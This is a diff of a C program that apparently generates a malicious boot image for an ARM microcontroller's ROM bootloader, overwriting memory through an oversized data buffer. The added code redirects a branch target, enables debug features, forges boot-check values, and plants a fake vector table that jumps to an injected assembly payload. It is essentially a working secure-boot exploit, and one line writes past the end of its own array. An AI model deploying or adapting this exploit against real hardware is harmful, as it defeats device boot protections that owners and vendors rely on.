@@ -70,13 +70,16 @@ int main() {
 	uint32_t extra_bytes[1000+0x4000] =  { 0 };
 	int in_fd, out_fd, assembly_fd, ret, size;
 	struct stat st;
+	// Sized to cover vector table + interrupts + instructions
+	uint32_t fake_table[0x4d] = { 0 };
+	int i;
 
 	// Extra data used for sb2 checking?
 	header.nonce[0] = 0x00000e8f;
 	// Branch target!
 	// Remember to set the low bit for thumb mode
-	//header.nonce[1] = 0x1301ae71;
-	header.nonce[1] = 0x14005a01;
+	header.nonce[1] = 0x1301ae71;
+	//header.nonce[1] = 0x14005a01;
 	// Branch to self (just for testing)
 	header.nonce[2] = 0xe7fee7fe;
 	// Extra 
@@ -147,6 +150,22 @@ int main() {
 	// 0x140017a0
 	extra_bytes[GLOBAL_ADDR(0x140017a4)] = 0x130013a0;
 	extra_bytes[GLOBAL_ADDR(0x140017a8)] = 0x6b088563;
+
+	// Our flash configuration (need it for later jumping)
+	extra_bytes[GLOBAL_ADDR(0x140019b0)] = 0;
+	extra_bytes[GLOBAL_ADDR(0x140019b4)] = 0x9de00;
+	extra_bytes[GLOBAL_ADDR(0x140019b8)] = 1;
+	extra_bytes[GLOBAL_ADDR(0x140019bc)] = 0x200;
+	extra_bytes[GLOBAL_ADDR(0x140019c0)] = 0x8000;
+	extra_bytes[GLOBAL_ADDR(0x140019c4)] = 0x9de00;
+	extra_bytes[GLOBAL_ADDR(0x140019c8)] = 0x2200;
+	extra_bytes[GLOBAL_ADDR(0x140019cc)] = 0x20;
+	extra_bytes[GLOBAL_ADDR(0x140019d0)] = 0x1;
+	extra_bytes[GLOBAL_ADDR(0x140019d4)] = 0x1;
+	extra_bytes[GLOBAL_ADDR(0x140019d8)] = 0x30;
+	extra_bytes[GLOBAL_ADDR(0x140019dc)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x140019e8)] = 0x4;
+	
 
 	// Flexcomm state
 	// Flexcomm IRQ handler
@@ -236,11 +255,32 @@ int main() {
 	extra_bytes[GLOBAL_ADDR(0x140051ac)] = 0x13001ff4;
 
 	extra_bytes[GLOBAL_ADDR(0x140051ec)] = 0x14;
+	// debug features
+	extra_bytes[GLOBAL_ADDR(0x140051f8)] = 0xfc0003ff;
+	extra_bytes[GLOBAL_ADDR(0x140051fc)] = 0xffff0000;
+	extra_bytes[GLOBAL_ADDR(0x14005200)] = 0xffff0000;
 
 	// Hmm our address...
 	extra_bytes[GLOBAL_ADDR(0x14005224)] = 0x50086000;
 
+	// Bytes for booting our image
+	extra_bytes[GLOBAL_ADDR(0x14005014)] = 0xbabadeda;
+	extra_bytes[GLOBAL_ADDR(0x14005018)] = 0x59595959;
+	// Supposed to be a consistency check, probably should have included a
+	// random number instead of something I could calc offline...
+	extra_bytes[GLOBAL_ADDR(0x14005058)] = 0x340158f4;
 
+
+	for (i = 0; i < 0x4d; i++) {
+		fake_table[i] = 0x14005531;
+	}
+
+	// stack pointer
+	fake_table[i] = 0x20004000;
+	// and our branch to self
+	fake_table[0x4c] = 0xe7fee7fe;
+
+	memcpy(&extra_bytes[GLOBAL_ADDR(0x14005400)], &fake_table, sizeof(fake_table));
 
 	in_fd = open("assembly.bin", O_RDONLY);
 
@@ -253,14 +293,6 @@ int main() {
 	fstat(in_fd, &st);
 	size = st.st_size;
 
-
-	// Canary for testing
-	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-4)] = 0x44444444;
-	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-8)] = 0x44444444;
-	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-0xc)] = 0xbbbbbbbb;
-	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-0x10)] = 0x77777777;
-
-	extra_bytes[GLOBAL_ADDR(0x14005918)] = 0x34343434;
 
 
 	ret = read(in_fd, &extra_bytes[GLOBAL_ADDR(0x14005a00)], size);
